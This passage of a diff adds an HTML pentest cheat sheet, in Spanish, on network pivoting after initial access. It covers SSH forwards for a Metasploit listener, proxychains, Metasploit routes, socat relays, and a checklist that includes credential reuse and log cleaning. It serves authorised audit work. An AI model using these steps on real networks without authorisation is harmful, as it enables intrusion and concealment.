+      <div class="acc-title"><div class="acc-dot" style="background:var(--acc2)"></div>REMOTE FORWARD (EXPOSE LOCAL SERVICE)</div>
+      <div class="acc-meta"><span class="acc-cnt">3</span><span class="acc-tag tag-c">SSH</span><span class="acc-chev">▾</span></div>
+    </div>
+    <div class="acc-body">
+      <div class="acc-desc">Puerto remoto → localhost. Exponer servicio local en red destino (reverse).</div>
+      <div class="ci"><div class="cl"><code>ssh -R 9090:127.0.0.1:4444 user@pivot</code><div class="cn">Metasploit listener en tu 4444 accesible como pivot:9090</div></div><button class="cpb" onclick="cp(event,this)">⎘</button></div>
+      <div class="ci"><div class="cl"><code>ssh -R 0.0.0.0:9090:127.0.0.1:4444 user@pivot</code><div class="cn">Escuchar en todas interfaces en pivot (requiere GatewayPorts yes)</div></div><button class="cpb" onclick="cp(event,this)">⎘</button></div>
+      <div class="ci"><div class="cl"><code">ssh -R 127.0.0.1:8888:127.0.0.1:22 user@pivot</code><div class="cn">SSH local accesible en pivot:8888 — escalada de acceso</div></div><button class="cpb" onclick="cp(event,this)">⎘</button></div>
+    </div>
+  </div>
+
+  <div class="acc" style="margin-top:8px">
+    <div class="acc-h" onclick="togAcc(this.parentElement)">
+      <div class="acc-title"><div class="acc-dot" style="background:var(--acc2)"></div>DYNAMIC PROXY (SOCKS5)</div>
+      <div class="acc-meta"><span class="acc-cnt">2</span><span class="acc-tag tag-c">SSH</span><span class="acc-chev">▾</span></div>
+    </div>
+    <div class="acc-body">
+      <div class="acc-desc">Todo tráfico TCP a través de pivot como proxy SOCKS5.</div>
+      <div class="ci"><div class="cl"><code>ssh -D 1080 -N user@pivot &</code><div class="cn">SOCKS proxy en localhost:1080 (modo background)</div></div><button class="cpb" onclick="cp(event,this)">⎘</button></div>
+      <div class="ci"><div class="cl"><code">proxychains nmap -sV -n 10.10.10.0/24</code><div class="cn">Ejecutar herramientas a través del proxy</div></div><button class="cpb" onclick="cp(event,this)">⎘</button></div>
+    </div>
+  </div>
+
+</div>
+
+<!-- ══════════ PANEL: PROXYCHAINS ══════════ -->
+<div class="panel" id="p-proxychains">
+
+  <div class="sh">PROXYCHAINS — STACK DE PROXIES</div>
+
+  <div class="acc open">
+    <div class="acc-h" onclick="togAcc(this.parentElement)">
+      <div class="acc-title"><div class="acc-dot" style="background:var(--acc2)"></div>CONFIGURACIÓN</div>
+      <div class="acc-meta"><span class="acc-cnt">5</span><span class="acc-tag tag-c">PROXYCHAINS</span><span class="acc-chev">▾</span></div>
+    </div>
+    <div class="acc-body">
+      <div class="acc-desc">Archivo /etc/proxychains.conf o ~/.proxychains.conf define cadena de proxies.</div>
+      <div class="ci"><div class="cl"><code">socks5 127.0.0.1 1080</code><div class="cn">En proxychains.conf — proxy local SSH SOCKS5</div></div><button class="cpb" onclick="cp(event,this)">⎘</button></div>
+      <div class="ci"><div class="cl"><code">socks5 pivot.internal 1080</code><div class="cn">Saltar a second pivot (si acceso directo exists)</div></div><button class="cpb" onclick="cp(event,this)">⎘</button></div>
+      <div class="ci"><div class="cl"><code">http 192.168.1.50 8080</code><div class="cn">HTTP proxy (menos flexible que SOCKS)</div></div><button class="cpb" onclick="cp(event,this)">⎘</button></div>
+      <div class="ci"><div class="cl"><code">proxychains -f ~/.proxychains.conf nmap -sT 10.10.10.5</code><div class="cn">Usar config personalizada</div></div><button class="cpb" onclick="cp(event,this)">⎘</button></div>
+      <div class="ci"><div class="cl"><code">proxychains curl -v http://internal.lan/</code><div class="cn">HTTP request a través de proxy stack</div></div><button class="cpb" onclick="cp(event,this)">⎘</button></div>
+    </div>
+  </div>
+
+  <div class="warn" style="margin-top:10px">⚠️ Proxychains = inyección de LD_PRELOAD. DNS puede filtrarse. Usar con cuidado en auditorías sigilosas.</div>
+
+</div>
+
+<!-- ══════════ PANEL: METASPLOIT ══════════ -->
+<div class="panel" id="p-metasploit">
+
+  <div class="sh">METASPLOIT — ROUTE + PIVOT</div>
+
+  <div class="acc open">
+    <div class="acc-h" onclick="togAcc(this.parentElement)">
+      <div class="acc-title"><div class="acc-dot" style="background:var(--acc2)"></div>POST-EXPLOIT ROUTING</div>
+      <div class="acc-meta"><span class="acc-cnt">6</span><span class="acc-tag tag-c">METASPLOIT</span><span class="acc-chev">▾</span></div>
+    </div>
+    <div class="acc-body">
+      <div class="acc-desc">Después de obtener shell — añadir rutas y usar pivot en Metasploit.</div>
+      
+      <div class="subtabs">
+        <button class="subtab-btn active" onclick="swTab(this, 'msfroute')">Routes</button>
+        <button class="subtab-btn" onclick="swTab(this, 'msfmod')">Modules</button>
+      </div>
+
+      <div id="msfroute" class="subtabs-content active">
+        <div class="ci"><div class="cl"><code>route add 10.10.10.0 255.255.255.0 SESSION_ID</code><div class="cn">En msfconsole — después de session abierta</div></div><button class="cpb" onclick="cp(event,this)">⎘</button></div>
+        <div class="ci"><div class="cl"><code>route print</code><div class="cn">Ver rutas activas</div></div><button class="cpb" onclick="cp(event,this)">⎘</button></div>
+        <div class="ci"><div class="cl"><code">route delete 10.10.10.0 255.255.255.0 SESSION_ID</code><div class="cn">Eliminar ruta</div></div><button class="cpb" onclick="cp(event,this)">⎘</button></div>
+      </div>
+
+      <div id="msfmod" class="subtabs-content">
+        <div class="ci"><div class="cl"><code">use auxiliary/server/socks4a</code><div class="cn">Crear SOCKS4a proxy en Metasploit (mismo límite: proxychains)</div></div><button class="cpb" onclick="cp(event,this)">⎘</button></div>
+        <div class="ci"><div class="cl"><code">use auxiliary/scanner/smb/smb_version</code><div class="cn">Scanners = automático usa rutas configuradas</div></div><button class="cpb" onclick="cp(event,this)">⎘</button></div>
+        <div class="ci"><div class="cl"><code">set RHOST 10.10.10.5</code><div class="cn">Especificar target en subnet interno</div></div><button class="cpb" onclick="cp(event,this)">⎘</button></div>
+      </div>
+    </div>
+  </div>
+
+</div>
+
+<!-- ══════════ PANEL: SOCAT ══════════ -->
+<div class="panel" id="p-socat">
+
+  <div class="sh">SOCAT — UNIX CONNECTOR</div>
+
+  <div class="acc open">
+    <div class="acc-h" onclick="togAcc(this.parentElement)">
+      <div class="acc-title"><div class="acc-dot" style="background:var(--acc2)"></div>RELAY Y TUNNEL</div>
+      <div class="acc-meta"><span class="acc-cnt">6</span><span class="acc-tag tag-c">SOCAT</span><span class="acc-chev">▾</span></div>
+    </div>
+    <div class="acc-body">
+      <div class="acc-desc">TCP relayer flexible — no cifrado pero lightweight. Útil cuando SSH no disponible.</div>
+      
+      <div class="subtabs">
+        <button class="subtab-btn active" onclick="swTab(this, 'socat-basic')">Basic</button>
+        <button class="subtab-btn" onclick="swTab(this, 'socat-relay')">Relay</button>
+      </div>
+
+      <div id="socat-basic" class="subtabs-content active">
+        <div class="ci"><div class="cl"><code">socat TCP-LISTEN:4000,reuseaddr TCP:127.0.0.1:3306</code><div class="cn">Listen 4000 → forward 127.0.0.1:3306 (servidor)</div></div><button class="cpb" onclick="cp(event,this)">⎘</button></div>
+        <div class="ci"><div class="cl"><code">socat TCP:127.0.0.1:4000 TCP:remote.lan:3306</code><div class="cn">Connect local:4000 y relay a remote:3306 (cliente)</div></div><button class="cpb" onclick="cp(event,this)">⎘</button></div>
+        <div class="ci"><div class="cl"><code">socat TCP-LISTEN:1080,reuseaddr SOCKS4A</code><div class="cn">SOCKS4A proxy (alternativa a SSH -D)</div></div><button class="cpb" onclick="cp(event,this)">⎘</button></div>
+      </div>
+
+      <div id="socat-relay" class="subtabs-content">
+        <div class="ci"><div class="cl"><code">socat TCP-LISTEN:9999,fork TCP:internal.db:3306 &</code><div class="cn">Fork = multiple concurrent connections</div></div><button class="cpb" onclick="cp(event,this)">⎘</button></div>
+        <div class="ci"><div class="cl"><code">socat TCP-LISTEN:22,reuseaddr,fork TCP:hidden.ssh:22</code><div class="cn">SSH relay — exponer SSH interno</div></div><button class="cpb" onclick="cp(event,this)">⎘</button></div>
+        <div class="ci"><div class="cl"><code">socat UDP-LISTEN:53,reuseaddr,fork UDP:8.8.8.8:53</code><div class="cn">DNS relay (TCP y UDP diferentes)</div></div><button class="cpb" onclick="cp(event,this)">⎘</button></div>
+      </div>
+    </div>
+  </div>
+
+  <div class="acc" style="margin-top:8px">
+    <div class="acc-h" onclick="togAcc(this.parentElement)">
+      <div class="acc-title"><div class="acc-dot" style="background:var(--acc2)"></div>SOCAT vs ALTERNATIVES</div>
+      <div class="acc-meta"><span class="acc-cnt">4</span><span class="acc-tag tag-g">COMPARE</span><span class="acc-chev">▾</span></div>
+    </div>
+    <div class="acc-body">
+      <div class="acc-desc">Cuándo usar Socat vs otras herramientas.</div>
+      <div class="ci"><div class="cl"><code class="g">Socat: Plaintext, lightweight, sin SSH requerido</code><div class="cn">Vs SSH: SSH es cifrado pero requiere key/pass. Vs Chisel: Chisel comprime, Socat no. Vs Ligolo: Ligolo tiene GUI.</div></div></div>
+      <div class="ci"><div class="cl"><code class="g">Escenario ideal Socat: Servidor restrictivo, no SSH instalado, necesitas relay rápido de TCP puro</code><div class="cn">Ejemplo: Windows cmd.exe con netcat replacements</div></div></div>
+      <div class="ci"><div class="cl"><code class="e">which socat || apt install socat</code><div class="cn">Verificar disponibilidad (no está en todos lados)</div></div><button class="cpb" onclick="cp(event,this)">⎘</button></div>
+      <div class="ci"><div class="cl"><code class="r">Detectable por: tráfico plaintext, procesos socat visibles, comportamiento de relay obvio en tcpdump</code><div class="cn">Logs: Nmap, netstat, procesos en ejecución. ZERO cifrado.</div></div></div>
+    </div>
+  </div>
+
+  <div class="acc" style="margin-top:8px">
+    <div class="acc-h" onclick="togAcc(this.parentElement)">
+      <div class="acc-title"><div class="acc-dot" style="background:var(--acc2)"></div>TROUBLESHOOTING</div>
+      <div class="acc-meta"><span class="acc-cnt">3</span><span class="acc-tag tag-c">DEBUG</span><span class="acc-chev">▾</span></div>
+    </div>
+    <div class="acc-body">
+      <div class="acc-desc">Errores y validación.</div>
+      <div class="ci"><div class="cl"><code class="r">Address already in use</code><div class="cn">Puerto ocupado. Ver: lsof -i :puerto. Usar puerto diferente o --SO-REUSEADDR.</div></div></div>
+      <div class="ci"><div class="cl"><code class="r">2024/01/15 10:30:00 socat[1234] E: connect(4, AF=2 0.0.0.0:3306, 16): Connection refused</code><div class="cn">Destino no existe o no escucha. Verificar IP:puerto.</div></div></div>
+      <div class="ci"><div class="cl"><code class="e">socat -d -d TCP-LISTEN:4000 TCP:127.0.0.1:3306</code><div class="cn">-d -d = verbose debug. Ver qué pasa en tiempo real.</div></div><button class="cpb" onclick="cp(event,this)">⎘</button></div>
+    </div>
+  </div>
+
+</div>
+
+<!-- ══════════ PANEL: CHECKLIST ══════════ -->
+<div class="panel" id="p-check">
+
+  <div class="pw">
+    <div class="pl">
+      <span>PIVOTING COMPLETO</span>
+      <span id="ppct">0%</span>
+    </div>
+    <div class="pb"><div class="pf" id="pfill"></div></div>
+  </div>
+
+  <div class="sh">FASE DE PIVOTING</div>
+  <div class="chki" onclick="ck(this)"><div class="chkb">✓</div><div class="chkt">Acceso inicial confirmado en máquina pivot</div><span class="chkph cc">INIT</span></div>
+  <div class="chki" onclick="ck(this)"><div class="chkb">✓</div><div class="chkt">Enumerar interfaces de red y subnets accesibles (ip addr, ifconfig, ipconfig /all)</div><span class="chkph cc">ENUM</span></div>
+  <div class="chki" onclick="ck(this)"><div class="chkb">✓</div><div class="chkt">Verificar conectividad a segmentos internos (ping, traceroute)</div><span class="chkph cc">CONN</span></div>
+  <div class="chki" onclick="ck(this)"><div class="chkb">✓</div><div class="chkt">Herramienta de tunneling elegida e instalada (Chisel, SSH, Ligolo-NG, etc)</div><span class="chkph cc">TOOL</span></div>
+
+  <div class="sh" style="margin-top:14px">TÚNELES ACTIVOS</div>
+  <div class="chki" onclick="ck(this)"><div class="chkb">✓</div><div class="chkt">Tunnel primario establecido (verificar: netstat, ss, process list)</div><span class="chkph cg">TUN1</span></div>
+  <div class="chki" onclick="ck(this)"><div class="chkb">✓</div><div class="chkt">Second pivot configurado si multi-hop (chain de tunnels probada)</div><span class="chkph cg">TUN2</span></div>
+  <div class="chki" onclick="ck(this)"><div class="chkb">✓</div><div class="chkt">DNS resolution probada en red destino (ping hostname.internal, nslookup)</div><span class="chkph cg">DNS</span></div>
+
+  <div class="sh" style="margin-top:14px">RECONOCIMIENTO LATERAL</div>
+  <div class="chki" onclick="ck(this)"><div class="chkb">✓</div><div class="chkt">Escaneo ligero de hosts internos (nmap -sT -Pn vía proxy)</div><span class="chkph ce">SCAN</span></div>
+  <div class="chki" onclick="ck(this)"><div class="chkb">✓</div><div class="chkt">Puertos abiertos documentados (SMB, RDP, SSH, bases datos, servicios web)</div><span class="chkph ce">PORTS</span></div>
+  <div class="chki" onclick="ck(this)"><div class="chkb">✓</div><div class="chkt">Credenciales reutilizadas o encontradas probadas en servicios internos</div><span class="chkph ce">CRED</span></div>
+
+  <div class="sh" style="margin-top:14px">SEGURIDAD DEL PIVOTING</div>
+  <div class="chki" onclick="ck(this)"><div class="chkb">✓</div><div class="chkt">Túneles cifrados (SSH, TLS Ligolo-NG) — no plaintext</div><span class="chkph cr">ENCRY</span></div>
+  <div class="chki" onclick="ck(this)"><div class="chkb">✓</div><div class="chkt">Puertos no expuestos públicamente en pivot (only bind localhost si posible)</div><span class="chkph cr">BIND</span></div>
+  <div class="chki" onclick="ck(this)"><div class="chkb">✓</div><div class="chkt">Logs limpios si contexto requiere (opcional según reglas de engagement)</div><span class="chkph cr">CLEAN</span></div>
+
+  <div class="sh" style="margin-top:14px">DOCUMENTACIÓN</div>
+  <div class="chki" onclick="ck(this)"><div class="chkb">✓</div><div class="chkt">Diagrama de red + ruta de pivoting guardado</div><span class="chkph cc">DOC</span></div>
+  <div class="chki" onclick="ck(this)"><div class="chkb">✓</div><div class="chkt">Comandos exactos y configuraciones en <code>$AUDIT/12-pivoting/</code></div><span class="chkph cc">DOC</span></div>
+  <div class="chki" onclick="ck(this)"><div class="chkb">✓</div><div class="chkt">Hallazgos en segmentos internos → forwarded a Fase 13 (Active Directory) si aplica</div><span class="chkph cc">NEXT</span></div>
+
+  <div class="ok" style="margin-top:14px">✅ Pivoting completado — segmento interno accesible.</div>
+
+</div>
+
+<!-- BOTTOM NAV -->
+<nav class="bnav">
+  <button class="bnav-btn active" onclick="sw('p-chisel',this)"><span class="icon">🔌</span>CHISEL</button>
+  <button class="bnav-btn" onclick="sw('p-reverse',this)"><span class="icon">↩️</span>REVERSE</button>
+  <button class="bnav-btn" onclick="sw('p-ligolo',this)"><span class="icon">🎯</span>LIGOLO</button>
+  <button class="bnav-btn" onclick="sw('p-ssh',this)"><span class="icon">🔐</span>SSH</button>
+  <button class="bnav-btn" onclick="sw('p-proxychains',this)"><span class="icon">⛓️</span>PROXY</button>
+  <button class="bnav-btn" onclick="sw('p-metasploit',this)"><span class="icon">⚔️</span>MSF</button>
+  <button class="bnav-btn" onclick="sw('p-socat',this)"><span class="icon">🔗</span>SOCAT</button>
+  <button class="bnav-btn" onclick="sw('p-check',this)"><span class="icon">✅</span>CHECK</button>
+</nav>
+
+</div>
+
+<script>
+function sw(id, btn) {
+  document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
+  document.querySelectorAll('.bnav-btn').forEach(b => b.classList.remove('active'));
+  document.getElementById(id).classList.add('active');
+  btn.classList.add('active');
+  window.scrollTo({top:0, behavior:'smooth'});
+}
+
+function togAcc(item) {
+  const isOpen = item.classList.contains('open');
+  document.querySelectorAll('.acc.open').forEach(i => { if(i!==item) i.classList.remove('open'); });
+  item.classList.toggle('open', !isOpen);
+}
+
+function swTab(btn, tabId) {
+  const parent = btn.parentElement.parentElement;
+  parent.querySelectorAll('.subtab-btn').forEach(b => b.classList.remove('active'));
+  parent.querySelectorAll('.subtabs-content').forEach(c => c.classList.remove('active'));
+  btn.classList.add('active');
+  document.getElementById(tabId).classList.add('active');
+}
+
+function cp(event, btn) {
+  event.stopPropagation();
+  const code = btn.previousElementSibling.querySelector('code').textContent.trim();
+  navigator.clipboard.writeText(code).then(() => {
+    btn.textContent = '✓'; btn.classList.add('ok');
+    setTimeout(() => { btn.textContent = '⎘'; btn.classList.remove('ok'); }, 1500);
+  });
+}
+
+function ck(el) {
+  el.classList.toggle('done');
+  const all  = document.querySelectorAll('.chki').length;
+  const done = document.querySelectorAll('.chki.done').length;
+  const pct  = Math.round(done / all * 100);
+  document.getElementById('ppct').textContent  = pct + '%';
+  document.getElementById('pfill').style.width = pct + '%';
+}
+</script>
+</body>
+</html>
